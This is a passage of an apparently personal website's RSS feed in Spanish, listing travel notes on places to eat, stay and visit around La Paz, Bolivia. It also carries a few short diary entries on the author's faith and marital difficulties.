Restaurantes Calacoto 16: Rufina (comida rapida artesanal) Calacoto 21: Rojo fire wine (carnes) Restaurante: Gustu, gourmet, calacoto c10 Restaurante: bonus sushi bar, calacoto Restaurante: el saber del sabor, cotacota c34 Restaurante: bajo irpavi, 8 y 9 Av Villegas, la casa del paceño Restaurante: bodegón porteño, sopocachi Parques Parque laikacota Parque parkour, alto obrajes, cerca telefer verde Parque museo pipiripi, Miraflores Parque Bartolina Siza, Aranjuez Parque de las Culturas, Estación Central en Teleferico Rojo Playground Diverland, Cotacota c30 Discos Cotacota 33, fabula.</description></item><item><title/><link>https://www.darvein.net/travel/bo/lapaz/sorata/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/travel/bo/lapaz/sorata/</guid><description> Sorata Places La feria son los días Sábados en la plaza principal, el auto debe ir por atras. Hotel Panchita (plaza principal) Mirador Ullintija Atahuallpani Ruta San cristobal (puente colgante) Takekala (pinturas, cultura moyo y alcohol artesanal) Helados Oso Golozo Mirador Willa koyo Gruta San pedro</description></item><item><title/><link>https://www.darvein.net/travel/bo/lapaz/yanacachi/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/travel/bo/lapaz/yanacachi/</guid><description> Yanacachi Lugares Velo de la novia Castillo del loro Viejo Unduavi Mirador de escalerpata Hospedaje + naturaleza en Hostal: Orquideas de Elena Notas En epoca de lluvia el camino es barroso y peligroso (febrero-junio) Comprar cafe de yanacachi! Comprar miel</description></item><item><title/><link>https://www.darvein.net/travel/bo/lapaz/zongo/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/travel/bo/lapaz/zongo/</guid><description> Zongo Entrada por Milluni Laguna Vizcachani, contactar Don Aurelio (curva puerta verde) Reservar cabaña max 10per 70171962 Caminata 1hr represa Tiquimani Botijlaca? Cahua Grande, pensión doña Alicia + hospedaje Zongo Nat para camping Harca puente colgate</description></item><item><title/><link>https://www.darvein.net/travel/travel_todos/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/travel/travel_todos/</guid><description>Travel TODOs Board TODOs Documentar: Muela del diablo LaPaz, Quime Potosi: Sajama Potosi: Casa Moneda Oruro: Plaza? Coroico: Yanacachi Documentar Milluni Documentar Sorata Documentar Pongo: Truchas Build list of needed baggage for travel (clothes, cleaning, etc) Documentar Cochabamba? Places to visit Bolivia, Sucre Monteagudo: Carrera caballos Bolivia, La Paz Sorata: Camino a la montaña, camping Urmiri: aguas termales Milluni: Laguna, Cementerio Achocalla: Flor de leche (restaurante) Mirador Valle de las Animas Bici Camino de la Muerte Escala Huayna Potosi Condoriri &amp;amp; Ventanani Coroico: Senda Verde Coroico: hotel villa verde: psicina resbalin Coroico: salida a pueblo El Choro, Rafting Coroico: Senda verde Coroico: san pedro de la loma Coroico: Unduavi Coroico, La finca, coroico Coroico, hotel dos Rios (buffet, psicinas, dj música) Coroico, cabaña victoria Haus (cancjitas, cocina, 180p Coroico, casa de Campo don nelson Coroico Cabaña villa kik Coroico Cabaña casa del rey, 2 plantas Coroico, Pozas del Vagante.</description></item><item><title/><link>https://www.darvein.net/y0emvc09/20230622-094955/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/y0emvc09/20230622-094955/</guid><description>20230622-094955 Entra a mi vida Empiezo este micro blog, mi espacio personal semi privado. Mis pensamientos, mis sentimientos, cosas que contar que no queden en el olvido.
Le pedí a Dios que entre a mi vida, abro mi corazón a él. Le pedí que no suelte mi mano, que ilumine mi camino.
Estos días tuve discusiones con ella, muy graves. Aún me odia mucho, por culpa mia, hoy me dí cuenta porque soy asi, tengo muchos vacios en el corazón.</description></item><item><title/><link>https://www.darvein.net/y0emvc09/20230627-214506/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/y0emvc09/20230627-214506/</guid><description>Gratificación 20230627-214506 Han sido días algo tensos, pero con paciencia y buen humor además de reflexionar y orar, las cosas se han podido llevar a mejor situación.
Ahora estoy mucho mejor con mi familia, todavía estan ahí algunas heridas del pasado, pero esta vez si estamos encaminados a superar las heridas para bién o para mal. Se hará a la voluntad de nuestro padre.
He estado reflexionando tantas cosas, pensando en mi, en ella, mi familia, la familia de mi mamá, la familia de mi papá, los abuelos, he estado tratando de comprender el porque soy asi, como fué mi infancia, como fué la infancia de mis padres, etc.</description></item><item><title/><link>https://www.darvein.net/y0emvc09/20230714-163557/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/y0emvc09/20230714-163557/</guid><description>20230714-163557 Indesiciones Todavía tengo inseguridades sobre mi matrimonio, no se si ella este interesada en salvar lo nuestro. A veces me parece que ha perdido toda la fé en lo nuestro, parece que esta 100% decidida a separarse, esta decidida a odiarme y no creer ni una sola palabra de lo que diga. No quiere que me acerque a ella de ninguna forma, me mantiene alejado, no me saluda ni me habla bién.</description></item><item><title/><link>https://www.darvein.net/y0emvc09/20230908-100651/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/y0emvc09/20230908-100651/</guid><description>20230908-100651 It is happening Mi situación de familia es complicada. Pero algo extraño estuvo pasando, estuve orando de vez en cuando pidiendo que las cosas se calmen&amp;hellip; y fué así durante un tiempo, pero yo traté de buscarle sentido a todo, sentí que algo me decía que me dé cuenta y que piense y abra los ojos. Algo me decía que deje de ver pasar los días, que miré mas allá, el futuro, objetivos, que sea yo mismo en la vida.</description></item><item><title>Contact</title><link>https://www.darvein.net/contact/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/contact/</guid><description>Follow me, @darvein.</description></item><item><title>CV</title><link>https://www.darvein.net/cv/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/cv/</guid><description>Dennis Ruiz - Curriculum .</description></item></channel></rss>